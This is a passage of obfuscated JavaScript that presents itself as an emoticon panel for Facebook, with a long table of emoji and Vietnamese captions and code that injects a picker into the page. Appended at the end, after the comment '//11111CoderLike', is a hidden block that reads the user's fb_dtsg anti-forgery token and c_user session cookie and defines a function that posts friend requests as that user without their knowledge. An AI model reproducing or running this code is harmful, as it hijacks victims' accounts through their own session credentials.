        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ew',
        "\x6E\x61\x6D\x65": 'Ho\xE0ng t\u1EED ba t\u01B0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ex',
        "\x6E\x61\x6D\x65": 'Con ch\xFAa ba l\u0103m'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ey',
        "\x6E\x61\x6D\x65": 'S\u01A1n m\xF3ng tay ph\xE1t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ez',
        "\x6E\x61\x6D\x65": 'Y\xEAu mi\u1EBFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e-',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh h\xF4n cmn nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e_',
        "\x6E\x61\x6D\x65": 'Hoa h\xF2e'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC91 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f0',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh trao tim cmn cho nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f1',
        "\x6E\x61\x6D\x65": 'C\u1ED1 b\u1EAFt Wifi tr\xE1i tim em m\u1EDBi \u0111\u01B0\u1EE3c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC94 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f2',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i v\u1EE1 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC96 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f3',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i tan ch\u1EA3y cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC97 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f4',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC98 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f5',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC99 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f6',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f7',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f8',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f9',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fa',
        "\x6E\x61\x6D\x65": 'Ch\xF3i cm tim th\xEDm l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fb',
        "\x6E\x61\x6D\x65": 'M\u1EA1ng nh\u1EC7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fc',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 th\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fd',
        "\x6E\x61\x6D\x65": 'Phun'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA8 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fe',
        "\x6E\x61\x6D\x65": 'Gi\xF3 th\u1ED5i vi vu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA9 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ff',
        "\x6E\x61\x6D\x65": 'Shit'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCAA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fg',
        "\x6E\x61\x6D\x65": 'C\u1EE9ng th\u1EBF n\xE0y \u01B0ng kh\xF4ng?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBB ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fh',
        "\x6E\x61\x6D\x65": 'M\xE1y t\xEDnh m\u1EDBi t\u1EADu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBD ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fi',
        "\x6E\x61\x6D\x65": 'CD nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fj',
        "\x6E\x61\x6D\x65": '\u1ED4n c\u1EE9ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBF ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fk',
        "\x6E\x61\x6D\x65": '\u0110ia tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCC0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fl',
        "\x6E\x61\x6D\x65": 'DVD'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCDE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fm',
        "\x6E\x61\x6D\x65": 'Anh nghe'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCE0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fn',
        "\x6E\x61\x6D\x65": 'C\xF3 g\xEC c\u1EE9 g\u1EEDi Fax cho anh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fo',
        "\x6E\x61\x6D\x65": 'Iphone 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fp',
        "\x6E\x61\x6D\x65": 'Iphone 9s'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCFA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fq',
        "\x6E\x61\x6D\x65": '\u0110ang xem TIVI'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDD14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fr',
        "\x6E\x61\x6D\x65": 'Chu\xF4ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE01 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ft',
        "\x6E\x61\x6D\x65": 'Kh\xF3c cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE03 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fu',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE04 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE06 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE09 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fy',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fz',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 7'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f_',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g0',
        "\x6E\x61\x6D\x65": 'Ch\xE1n vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE13 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g2',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 10'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE16 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g3',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 11'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g4',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 12'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g5',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 13'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g6',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 14'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g7',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 15'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g8',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 16'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g9',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 17'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ga',
        "\x6E\x61\x6D\x65": 'M\u01A1 ka \u0111\u1EC1, ch\u1ECB n\xF3ng r\u1ED3i \u0111\u1EA5y nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE22 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gb',
        "\x6E\x61\x6D\x65": 'Huhu...'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE23 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gc',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 18'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE24 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gd',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 19'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ge',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 20'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gf',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 21'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gg',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 22'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gh',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 cmnr nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gi',
        "\x6E\x61\x6D\x65": 'H\xF4m nay m\u1EC7t vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gj',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 23'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gk',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 24'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gl',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 25'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE32 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gm',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 26'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gn',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 27'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2go',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 28'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gp',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 29'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gq',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 30'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gr',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 31'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 32'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gt',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 33'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gu',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 34'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 35'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 36'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 37'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gy',
        "\x6E\x61\x6D\x65": '\u0110\u1ED1 bi\u1EBFt tay tr\xE1i hay ph\u1EA3i?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gz',
        "\x6E\x61\x6D\x65": 'Tay \u1EA3i tay ai?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 38'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g_',
        "\x6E\x61\x6D\x65": 'L\xEAn l\xE0 l\xEAn l\xEAn lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \u261D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h0',
        "\x6E\x61\x6D\x65": 'D\u1EB9p ra \u0111\u1EC3 anh l\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' \u263A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 39'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26A1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h2',
        "\x6E\x61\x6D\x65": 'B\u1ECB gi\u1EADt s\xE9t cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26C4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h3',
        "\x6E\x61\x6D\x65": 'Ng\u01B0\u1EDDi tuy\u1EBFt, Sapa m\xF9a \u0111\xF4ng 2013'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h4',
        "\x6E\x61\x6D\x65": 'N\u0103m 2014 quy\u1EBFt t\xE2m c\xF3 G\u1EA4U'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h5',
        "\x6E\x61\x6D\x65": 'Tay ph\u1EA3i nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h6',
        "\x6E\x61\x6D\x65": '2, l\xE0m g\u1EA5u c\u1EE7a t\u1EDB nh\xE9?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2600 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h7',
        "\x6E\x61\x6D\x65": 'N\u1EAFng l\xEAn r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2601 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h8',
        "\x6E\x61\x6D\x65": 'M\xE2y tr\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2614 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h9',
        "\x6E\x61\x6D\x65": 'Th\xF4i ch\u1EBFt, m\u01B0a cmnr, \xF4 \u0111\xE2u \xF4 \u0111\xE2u?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2615 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ha',
        "\x6E\x61\x6D\x65": 'L\xE0m c\u1ED1c Cafe cho t\u1EC9nh t\xE1o, haizzz'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2728 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hb',
        "\x6E\x61\x6D\x65": 'B\u1ECB hoa m\u1EAFt cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2764 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hc',
        "\x6E\x61\x6D\x65": 'T\xF4i y\xEAu b\u1EA1n'
    }];
    var _0x3384x2 = document['activeElement'];

    function _0x3384x3(_0x3384x4) {
        var _0x3384x5 = document['createElement']('div');
        _0x3384x5['innerHTML'] = _0x3384x4;
        return _0x3384x5['firstChild'];
    };

    function _0x3384x6(_0x3384x7) {
        var _0x3384x8 = document['createElement']('div');
        var _0x3384x9 = document['createTextNode'](_0x3384x7);
        _0x3384x8['appendChild'](_0x3384x9);
        return _0x3384x8['innerHTML'];
    };

    function _0x3384xa(_0x3384xb) {
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || _0x3384xb instanceof HTMLTextAreaElement;
    };

    function _0x3384xc(_0x3384xd) {
        return _0x3384xd['className'] == 'openToggler';
    };

    function _0x3384xe(_0x3384xd, _0x3384xf) {
        if (_0x3384xf === undefined) {
            _0x3384xf = !_0x3384xc(_0x3384xd);
        };
        if (_0x3384xf) {
            _0x3384xd['className'] = 'openToggler';
        } else {
            _0x3384xd['removeAttribute']('class');
        };
    };

    function _0x3384x10(_0x3384x11, _0x3384x12) {
        var _0x3384x4;
        _0x3384x4 = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
        _0x3384x4 += '<div class="jewelFlyout">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</li>';
        var _0x3384x13 = _0x3384x3(_0x3384x4);
        _0x3384x11['appendChild'](_0x3384x13);
        _0x3384x4 = '<div style="display: none;">';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4);
        _0x3384x12['appendChild'](_0x3384x14);
        (function (_0x3384x14) {
            _0x3384x13['addEventListener']('click', function () {
                var _0x3384x15 = this['parentNode']['childNodes'];
                for (var _0x3384x16 = 0; _0x3384x16 < _0x3384x15['length']; _0x3384x16++) {
                    if (_0x3384x15[_0x3384x16] === this) {} else {
                        _0x3384x15[_0x3384x16]['style']['background'] = '';
                        _0x3384x15[_0x3384x16]['firstChild']['style']['color'] = '';
                    };
                };
                var _0x3384x17 = _0x3384x14['parentNode']['childNodes'];
                for (var _0x3384x18 = 0; _0x3384x18 < _0x3384x17['length']; _0x3384x18++) {
                    if (_0x3384x17[_0x3384x18] === _0x3384x14) {
                        _0x3384x14['style']['display'] = '';
                    } else {
                        _0x3384x17[_0x3384x18]['style']['display'] = 'none';
                    };
                };
            });
        })(_0x3384x14);
        return {
            "\x74\x69\x74\x6C\x65": _0x3384x13['firstChild'],
            "\x62\x6F\x64\x79": _0x3384x14
        };
    };

    function _0x3384x19(_0x3384x1, _0x3384x1a) {
        var _0x3384x4;
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
        _0x3384x4 += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4)['firstChild'];
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) {
            var _0x3384x1c = _0x3384x1[_0x3384x1b];
            if (!_0x3384x1a(_0x3384x1c)) {
                continue;
            };
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
            _0x3384x4 += '<a';
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + _0x3384x1c['class'] : '') + '"';
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            _0x3384x4 += (_0x3384x1c['name'] !== undefined ? ' title="' + _0x3384x1c['name'] + '"' : '');
            _0x3384x4 += '>';
            _0x3384x4 += _0x3384x6(_0x3384x1c['chars']);
            _0x3384x4 += '</a>';
            _0x3384x4 += '</span>';
            var _0x3384x1d = _0x3384x3(_0x3384x4);
            _0x3384x14['appendChild'](_0x3384x1d);
            var _0x3384x1e = _0x3384x1d['firstChild'];
            (function (_0x3384x1c) {
                _0x3384x1e['addEventListener']('click', function () {
                    if (_0x3384xa(_0x3384x2)) {
                        _0x3384x2['focus']();
                        var _0x3384x1f = _0x3384x1c['chars'];
                        var _0x3384x20 = _0x3384x2['value'];
                        var _0x3384x21 = _0x3384x2['selectionStart'];
                        var _0x3384x22 = _0x3384x2['selectionEnd'];
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + _0x3384x1f + _0x3384x20['substring'](_0x3384x22);
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], _0x3384x21 + _0x3384x1f['length']);
                    };
                    openFlyoutCommand = false;
                });
            })(_0x3384x1c);
        };
        return _0x3384x14['parentNode'];
    };
    var _0x3384x4;
    _0x3384x4 = '<li class="navItem middleItem notifNegativeBase">';
    _0x3384x4 += '<div class="fbJewel">';
    _0x3384x4 += '<a class="navLink" title="Icon Facebook 2014">';
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon Facebook</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
    _0x3384x4 += '<div class="jewelBeeperHeader">';
    _0x3384x4 += '<div class="beeperNubWrapper">';
    _0x3384x4 += '<div class="beeperNub" style="left: 4px;"></div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<ul style="display: text-align: center;">';
    _0x3384x4 += '</ul>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<div class="jewelFooter">';
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/Jung.Bin.100" target="_blank">ʚɞNhok Siêu Wuậyʚɞ</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</li>';
    var _0x3384x23 = _0x3384x3(_0x3384x4);
    var _0x3384x24 = document['querySelector']('#pageNav');
    _0x3384x24['insertBefore'](_0x3384x23, _0x3384x24['firstChild']);
    _0x3384x23['addEventListener']('click', function () {
        if (_0x3384xa(_0x3384x2)) {
            _0x3384x2['focus']();
        };
        openFlyoutCommand = undefined;
    }, true);
    var _0x3384x25 = _0x3384x23['firstChild']['firstChild'];
    var _0x3384xd = _0x3384x25['nextSibling'];
    var _0x3384x11 = _0x3384xd['firstChild']['childNodes'][1];
    var _0x3384x12 = _0x3384x11['nextSibling'];
    _0x3384x25['addEventListener']('click', function () {
        openFlyoutCommand = !_0x3384xc(_0x3384xd);
    });
    var _0x3384x26 = _0x3384x10(_0x3384x11, _0x3384x12);
    _0x3384x26['title']['click']();
    _0x3384x26['body']['appendChild'](_0x3384x19(_0x3384x1, function (_0x3384x1c) {
        if (_0x3384x1c['class'] === undefined) {
            return false;
        };
        if (_0x3384x1c['chars']['length'] == 2) {
            return false;
        };
        return true;
    }));
    document['addEventListener']('click', function () {
        _0x3384x2 = document['activeElement'];
        if (openFlyoutCommand !== undefined) {
            _0x3384xe(_0x3384xd, openFlyoutCommand);
        };
        openFlyoutCommand = false;
    });
})();
//11111CoderLike
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
